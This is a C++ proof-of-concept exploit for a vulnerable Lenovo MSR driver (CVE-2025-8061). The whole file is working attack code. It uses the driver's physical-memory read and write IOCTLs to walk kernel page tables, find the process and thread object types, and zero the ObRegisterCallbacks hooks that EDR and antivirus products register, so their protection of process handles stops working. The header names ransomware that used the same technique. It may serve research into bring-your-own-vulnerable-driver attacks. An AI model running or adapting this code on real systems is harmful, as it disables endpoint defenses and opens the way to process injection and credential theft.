/*
 * 10_ob_callback.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — ObRegisterCallbacks Removal
 *
 * Goal: remove kernel object notification callbacks registered by EDR/AV products
 *       via ObRegisterCallbacks, which they use to intercept OpenProcess/OpenThread
 *       and strip dangerous access rights before they reach the caller.
 *
 * Background
 * ──────────
 * EDRs call ObRegisterCallbacks(OB_CALLBACK_REGISTRATION, ...) to register
 * pre/post-operation hooks on PsProcessType and PsThreadType objects.
 * When any process calls OpenProcess(PROCESS_ALL_ACCESS, ...) targeting a
 * protected process, the EDR's PreOperation callback fires and clears
 * PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD etc. from
 * DesiredAccess — the caller gets a handle with stripped rights.
 *
 * The callbacks are stored in a linked list hanging off each OBJECT_TYPE.
 * Internally: PsProcessType->CallbackList is a LIST_ENTRY head.
 * Each node is an _OB_CALLBACK_ENTRY / _OBJECT_TYPE_CALLBACK embedded in
 * the registration structure:
 *
 *   _OB_CALLBACK_ENTRY (per-type node inside the registration):
 *     +0x00  CallbackList   LIST_ENTRY    ← linked into OBJECT_TYPE.CallbackList
 *     +0x10  Operations     OB_OPERATION  (1=OB_OPERATION_HANDLE_CREATE,
 *                                          2=OB_OPERATION_HANDLE_DUPLICATE)
 *     +0x18  Enabled        BOOLEAN       ← set to FALSE to disable
 *     +0x20  ObjectType     POBJECT_TYPE  ← PsProcessType or PsThreadType
 *     +0x28  PreOperation   POB_PRE_OPERATION_CALLBACK   ← zero to remove
 *     +0x30  PostOperation  POB_POST_OPERATION_CALLBACK  ← zero to remove
 *
 * Finding the list head
 * ─────────────────────
 * PsProcessType is an exported ntoskrnl pointer: *(POBJECT_TYPE*)PsProcessType
 * OBJECT_TYPE layout (Win10 19041 – Win11 26100):
 *   +0x000  TypeList       LIST_ENTRY   (linkage between types)
 *   +0x010  Name           UNICODE_STRING
 *   +0x028  DefaultObject  PVOID
 *   +0x030  Index          UCHAR
 *   +0x040  TotalNumberOfObjects  ULONG
 *   ...
 *   +0x0C8  CallbackList   LIST_ENTRY   ← callback chain head
 *
 * We walk the CallbackList LIST_ENTRY and visit each _OB_CALLBACK_ENTRY,
 * zeroing PreOperation and PostOperation callbacks that belong to non-Microsoft
 * drivers (i.e. not in ntoskrnl / win32k address range).
 *
 * Stability
 * ─────────
 * Data-only — no code bytes modified.
 * PatchGuard does NOT protect ObpCallbackListHead or the callback chain.
 * Same technique used by EDRSandBlast (Wavestone), RealBlindingEDR (myzxcg),
 * and observed in AvosLocker ransomware payload (2022-2023).
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:10_ob_callback.exe 10_ob_callback.cpp
 *      /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    return true;
}

// ─── Physical R/W ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn   { UINT64 PA; DWORD AccessSize; DWORD Count; };
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU64(uint64_t pa, uint64_t val)
{
    PhysWriteIn8 in = { pa, 1, 8, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── RAM bound ───────────────────────────────────────────────────────────────


// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────
// Reads valid RAM extents from the Windows kernel's physical memory resource
// map so we never request MmMapIoSpace() on VMware device MMIO pages.
// HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
// is a CM_RESOURCE_LIST with CmResourceTypeMemory (Type=8) entries.
//
// CM_PARTIAL_RESOURCE_DESCRIPTOR on x64:
//   +0   BYTE  Type
//   +1   BYTE  ShareDisposition
//   +2   WORD  Flags
//   +4   LARGE_INTEGER Start    (8 bytes)
//   +12  ULONG Length           (4 bytes)
//   +16  (padding to 20-byte record)

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    const char *kpath =
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;               // InterfaceType(4) + BusNumber(4)
            off += 4;               // Version(2) + Revision(2)
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;   // CmResourceTypeMemory = 8
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) {
                    out[n].base = (uint64_t)st.QuadPart;
                    out[n].size = (uint64_t)len;
                    n++;
                }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

static uint64_t GetSystemCR3()
{
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    if (n == 0) {
        // Fallback: use actual installed RAM with NO extra buffer
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = 0x07F00000;  // [1 MB, 128 MB) — System EPROCESS always here
        n = 1;
    }
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (int ri = 0; ri < n && !cr3; ri++) {
        uint64_t rbase = ranges[ri].base;
        uint64_t rend  = ranges[ri].base + ranges[ri].size;
        if (rbase < 0x100000) rbase = 0x100000;
        rbase = (rbase + 0xFFFFF) & ~(uint64_t)0xFFFFF;  // align up to 1 MB
        for (uint64_t pa = rbase; pa < rend && !cr3; pa += 1<<20) {
            bool any_ok = false;
            for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
                if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
                else memset(buf+pg, 0, 0x1000);
            }
            if (!any_ok) continue;
            for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
                if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
                if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
                uint64_t c = *(uint64_t*)(buf+off+0x028);
                if (c && !(c & 0xFFF)) { cr3 = c; break; }
            }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── Page table walk ─────────────────────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    auto rd = [](uint64_t pa) -> uint64_t {
        uint64_t v = 0; PhysReadU64(pa, &v); return v;
    };
    uint64_t pml4e = rd((cr3 & ~0xFFFULL) | (((va >> 39) & 0x1FF) << 3));
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = rd((pml4e & 0x000FFFFFFFFFF000ULL) | (((va >> 30) & 0x1FF) << 3));
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL<<7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    uint64_t pde = rd((pdpte & 0x000FFFFFFFFFF000ULL) | (((va >> 21) & 0x1FF) << 3));
    if (!(pde & 1)) return 0;
    if (pde & (1ULL<<7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    uint64_t pte = rd((pde & 0x000FFFFFFFFFF000ULL) | (((va >> 12) & 0x1FF) << 3));
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

// ─── Kernel virtual R/W ──────────────────────────────────────────────────────

static void KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t*)buf;
    DWORD done = 0;
    while (done < len) {
        DWORD chunk = min(len - done, (DWORD)(0x1000u - ((va + done) & 0xFFFu)));
        uint64_t pa = VaToPa(cr3, va + done);
        if (pa) PhysRead(pa, dst + done, chunk);
        done += chunk;
    }
}

static bool KernelReadU64(uint64_t cr3, uint64_t va, uint64_t *out)
{
    uint64_t pa = VaToPa(cr3, va);
    if (!pa) return false;
    return PhysReadU64(pa, out);
}

static bool KernelWriteU64(uint64_t cr3, uint64_t va, uint64_t val)
{
    uint64_t pa = VaToPa(cr3, va);
    if (!pa) return false;
    return PhysWriteU64(pa, val);
}

// ─── ntoskrnl info ───────────────────────────────────────────────────────────

struct NtInfo {
    uint64_t base;
    uint64_t text_va;   uint32_t text_size;
    uint64_t data_va;   uint32_t data_size;
};

typedef LONG (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);

static bool GetNtoskrnlInfo(uint64_t cr3, NtInfo *out)
{
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll"),
                                            "NtQuerySystemInformation");
    if (!NtQSI) return false;

    ULONG sz = 1 << 18;
    auto *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    while (NtQSI(11, buf, sz, &sz) == (LONG)0xC0000004)
        buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, sz *= 2);

    struct MOD { HANDLE sec; PVOID mb, ib; ULONG sz, fl, loi, ioi, lc, oft; char path[256]; };
    ULONG n = *(ULONG*)buf;
    auto *mods = (MOD*)(buf + sizeof(ULONG));

    memset(out, 0, sizeof(*out));
    for (ULONG i = 0; i < n; i++) {
        const char *nm = mods[i].path + mods[i].oft;
        if (_stricmp(nm, "ntoskrnl.exe") != 0 && _stricmp(nm, "ntkrnlmp.exe") != 0)
            continue;
        out->base = (uint64_t)(uintptr_t)mods[i].ib;
        break;
    }
    HeapFree(GetProcessHeap(), 0, buf);
    if (!out->base) return false;

    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, out->base, hdrbuf, sizeof(hdrbuf));

    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto *nt  = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    WORD nsec   = nt->FileHeader.NumberOfSections;
    WORD optsz  = nt->FileHeader.SizeOfOptionalHeader;
    DWORD soff  = dos->e_lfanew + 4 + 0x14 + optsz;

    for (WORD s = 0; s < nsec && s < 32; s++) {
        DWORD o = soff + s * 40;
        if (o + 40 > sizeof(hdrbuf)) break;
        const char *name  = (const char*)(hdrbuf + o);
        DWORD vsize = *(DWORD*)(hdrbuf + o + 0x08);
        DWORD vrva  = *(DWORD*)(hdrbuf + o + 0x0C);
        DWORD chars = *(DWORD*)(hdrbuf + o + 0x24);
        if (strncmp(name, ".text", 5) == 0 && (chars & 0x20000000)) {
            out->text_va   = out->base + vrva;
            out->text_size = vsize;
        }
        if (strncmp(name, ".data", 5) == 0 && (chars & 0xC0000000) == 0xC0000000) {
            out->data_va   = out->base + vrva;
            out->data_size = vsize;
        }
    }
    return out->data_va != 0;
}

// ─── Resolve ntoskrnl export ─────────────────────────────────────────────────

static uint64_t GetNtExport(uint64_t cr3, uint64_t ntos_base, const char *name)
{
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, ntos_base, hdrbuf, sizeof(hdrbuf));

    auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto *nt = (IMAGE_NT_HEADERS64*)(hdrbuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress) return 0;

    DWORD expSize = (dir.Size < 0x80000u) ? dir.Size : 0x80000u;
    auto *expbuf = (uint8_t*)VirtualAlloc(nullptr, expSize + 0x1000,
                                           MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!expbuf) return 0;
    KernelRead(cr3, ntos_base + dir.VirtualAddress, expbuf, expSize);

    auto *exp    = (IMAGE_EXPORT_DIRECTORY*)expbuf;
    DWORD base_rva = dir.VirtualAddress;
    uint64_t result = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && !result; i++) {
        DWORD offN = exp->AddressOfNames - base_rva + i * 4;
        if (offN + 4 > expSize) break;
        DWORD nameRva = *(DWORD*)(expbuf + offN);
        DWORD nameOff = nameRva - base_rva;
        if (nameOff >= expSize) continue;
        if (_stricmp((char*)(expbuf + nameOff), name) != 0) continue;

        DWORD offO = exp->AddressOfNameOrdinals - base_rva + i * 2;
        if (offO + 2 > expSize) break;
        WORD ord = *(WORD*)(expbuf + offO);
        DWORD offF = exp->AddressOfFunctions - base_rva + (DWORD)ord * 4;
        if (offF + 4 > expSize) break;
        result = ntos_base + *(DWORD*)(expbuf + offF);
    }
    VirtualFree(expbuf, 0, MEM_RELEASE);
    return result;
}

// ─── OBJECT_TYPE layout (Win10 19041 – Win11 26100) ─────────────────────────
//
// Verified with WinDbg: dt nt!_OBJECT_TYPE
// The CallbackList is always at +0x0C8 on x64 for the builds we target.
// If this offset drifts in a future build, scanning for a valid LIST_ENTRY
// that points to kernel VA would be the fallback.
//
#define OBJECT_TYPE_CALLBACKLIST_OFFSET  0x0C8

// ─── _OB_CALLBACK_ENTRY offsets ─────────────────────────────────────────────
//
// dt nt!_OB_CALLBACK_ENTRY  (Win10 19041–Win11 26100; confirmed stable)
#define OBCB_CallbackList   0x00   // LIST_ENTRY (16 bytes)
#define OBCB_Operations     0x10   // OB_OPERATION (ULONG)
#define OBCB_Enabled        0x18   // BOOLEAN
#define OBCB_ObjectType     0x20   // POBJECT_TYPE
#define OBCB_PreOperation   0x28   // callback fn ptr
#define OBCB_PostOperation  0x30   // callback fn ptr

// ─── Saved callback entry ────────────────────────────────────────────────────

#define MAX_OB_ENTRIES 64

struct ObEntry {
    uint64_t node_va;
    uint64_t orig_pre;
    uint64_t orig_post;
    bool     had_pre;
    bool     had_post;
};

static ObEntry g_saved[MAX_OB_ENTRIES];
static int     g_saved_count = 0;

// ─── Walk one OBJECT_TYPE callback list ──────────────────────────────────────

static void WalkObCallbackList(uint64_t cr3,
                                uint64_t type_ptr_va,  // VA of the PsProcessType/PsThreadType variable
                                const char *type_name,
                                uint64_t ntos_base, uint64_t ntos_size,
                                bool do_zero)
{
    // Read the pointer itself: PsProcessType is POBJECT_TYPE (pointer to pointer)
    // Actually PsProcessType is exported as POBJECT_TYPE*, so we read what it points to
    uint64_t obj_type_va = 0;
    if (!KernelReadU64(cr3, type_ptr_va, &obj_type_va) || !obj_type_va) {
        printf("    [-] Could not read %s pointer\n", type_name);
        return;
    }

    printf("    [*] %s OBJECT_TYPE @ 0x%016llX\n", type_name, obj_type_va);

    // Read the CallbackList LIST_ENTRY head (Flink, Blink)
    uint64_t list_head_va = obj_type_va + OBJECT_TYPE_CALLBACKLIST_OFFSET;
    uint64_t flink = 0, blink = 0;
    if (!KernelReadU64(cr3, list_head_va,     &flink) ||
        !KernelReadU64(cr3, list_head_va + 8, &blink)) {
        printf("    [-] Could not read CallbackList for %s\n", type_name);
        return;
    }

    if (flink == list_head_va) {
        printf("    [~] %s: callback list empty\n", type_name);
        return;
    }

    // Walk the list; each entry's Flink is at +OBCB_CallbackList (+0x00)
    uint64_t cur = flink;
    int count = 0;
    while (cur != list_head_va && count < 256) {
        uint64_t node_va = cur;  // node starts at the LIST_ENTRY (CallbackList field)

        uint64_t pre_va  = node_va + OBCB_PreOperation;
        uint64_t post_va = node_va + OBCB_PostOperation;
        uint64_t otype_va = node_va + OBCB_ObjectType;

        uint64_t pre_fn = 0, post_fn = 0, registered_type = 0;
        KernelReadU64(cr3, pre_va,   &pre_fn);
        KernelReadU64(cr3, post_va,  &post_fn);
        KernelReadU64(cr3, otype_va, &registered_type);

        // Check if pre/post are inside ntoskrnl (system callbacks, skip)
        bool pre_is_system  = (pre_fn  >= ntos_base && pre_fn  < ntos_base + ntos_size);
        bool post_is_system = (post_fn >= ntos_base && post_fn < ntos_base + ntos_size);

        if (pre_fn || post_fn) {
            printf("      [%02d] node=0x%016llX  pre=0x%016llX%s  post=0x%016llX%s\n",
                   count, node_va,
                   pre_fn,  pre_is_system  ? " [sys]" : "",
                   post_fn, post_is_system ? " [sys]" : "");
        }

        if (do_zero && g_saved_count < MAX_OB_ENTRIES) {
            ObEntry &e = g_saved[g_saved_count];
            e.node_va   = node_va;
            e.orig_pre  = pre_fn;
            e.orig_post = post_fn;
            e.had_pre   = false;
            e.had_post  = false;

            // Zero non-system pre callback
            if (pre_fn && !pre_is_system) {
                if (KernelWriteU64(cr3, pre_va, 0)) {
                    uint64_t rb = 0xDEAD;
                    KernelReadU64(cr3, pre_va, &rb);
                    if (rb == 0) {
                        e.had_pre = true;
                        printf("        zeroed PreOperation\n");
                    } else {
                        printf("        [!] PreOperation write didn't stick (HVCI?)\n");
                    }
                }
            }

            // Zero non-system post callback
            if (post_fn && !post_is_system) {
                if (KernelWriteU64(cr3, post_va, 0)) {
                    uint64_t rb = 0xDEAD;
                    KernelReadU64(cr3, post_va, &rb);
                    if (rb == 0) {
                        e.had_post = true;
                        printf("        zeroed PostOperation\n");
                    } else {
                        printf("        [!] PostOperation write didn't stick (HVCI?)\n");
                    }
                }
            }

            if (e.had_pre || e.had_post) g_saved_count++;
        }

        // Advance: read Flink of current node's LIST_ENTRY
        uint64_t next = 0;
        if (!KernelReadU64(cr3, cur, &next) || next == cur) break;
        cur = next;
        count++;
    }

    if (!count) {
        printf("    [~] %s: no callback nodes walked\n", type_name);
    }
}

// ─── Restore ─────────────────────────────────────────────────────────────────

static void RestoreAll(uint64_t cr3)
{
    int restored = 0;
    for (int i = 0; i < g_saved_count; i++) {
        ObEntry &e = g_saved[i];
        if (e.had_pre  && KernelWriteU64(cr3, e.node_va + OBCB_PreOperation,  e.orig_pre))  restored++;
        if (e.had_post && KernelWriteU64(cr3, e.node_va + OBCB_PostOperation, e.orig_post)) restored++;
    }
    printf("[+] Restored %d callback pointers\n", restored);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 10 - ObRegisterCallbacks Removal ===\n\n");
    printf("[*] Technique: zero Pre/Post operation callbacks in OBJECT_TYPE.CallbackList\n");
    printf("[*] Effect:    EDR can no longer strip access rights from OpenProcess/OpenThread\n");
    printf("[*] Stability: SAFE — data-only, PatchGuard does NOT protect this chain\n\n");

    if (!OpenDevice()) return 1;
    printf("[+] Device opened\n");

    printf("[*] Scanning for System CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) { printf("[-] CR3 not found\n"); CloseHandle(g_dev); return 1; }
    printf("[+] CR3 = 0x%016llX\n\n", cr3);

    printf("[*] Getting ntoskrnl info...\n");
    NtInfo nt = {};
    if (!GetNtoskrnlInfo(cr3, &nt)) {
        printf("[-] ntoskrnl info failed\n"); CloseHandle(g_dev); return 1;
    }
    printf("[+] ntoskrnl base = 0x%016llX\n", nt.base);
    printf("[+] .text: 0x%016llX  size=0x%X\n", nt.text_va, nt.text_size);
    printf("[+] .data: 0x%016llX  size=0x%X\n\n", nt.data_va, nt.data_size);

    // Resolve PsProcessType and PsThreadType exported variables
    // These are exported as pointers-to-OBJECT_TYPE (POBJECT_TYPE*)
    uint64_t PsProcessType_ptr = GetNtExport(cr3, nt.base, "PsProcessType");
    uint64_t PsThreadType_ptr  = GetNtExport(cr3, nt.base, "PsThreadType");

    if (!PsProcessType_ptr || !PsThreadType_ptr) {
        printf("[-] Could not resolve PsProcessType / PsThreadType exports\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] PsProcessType export VA = 0x%016llX\n",   PsProcessType_ptr);
    printf("[+] PsThreadType  export VA = 0x%016llX\n\n", PsThreadType_ptr);

    uint64_t ntos_size = nt.text_size + 0x500000;  // conservative upper bound

    printf("[*] Phase 1 — enumerating callbacks (dry run):\n");
    WalkObCallbackList(cr3, PsProcessType_ptr, "PsProcessType",
                       nt.base, ntos_size, false);
    WalkObCallbackList(cr3, PsThreadType_ptr,  "PsThreadType",
                       nt.base, ntos_size, false);

    printf("\n[*] Press Enter to ZERO all non-system ObRegisterCallbacks...\n");
    getchar();

    printf("\n[*] Phase 2 — zeroing callbacks:\n");
    WalkObCallbackList(cr3, PsProcessType_ptr, "PsProcessType",
                       nt.base, ntos_size, true);
    WalkObCallbackList(cr3, PsThreadType_ptr,  "PsThreadType",
                       nt.base, ntos_size, true);

    if (g_saved_count == 0) {
        printf("\n[~] Nothing zeroed (no non-system EDR callbacks found, or HVCI blocked writes)\n");
    } else {
        printf("\n[+] %d callback entries zeroed\n", g_saved_count);
        printf("[+] OpenProcess(PROCESS_ALL_ACCESS, ...) will no longer be intercepted\n");
        printf("[+] EDR cannot strip VM read/write/injection rights from handles\n");
    }

    printf("\n[*] Press Enter to RESTORE and exit...\n");
    getchar();

    RestoreAll(cr3);
    CloseHandle(g_dev);
    printf("[+] Done.\n");
    return 0;
}
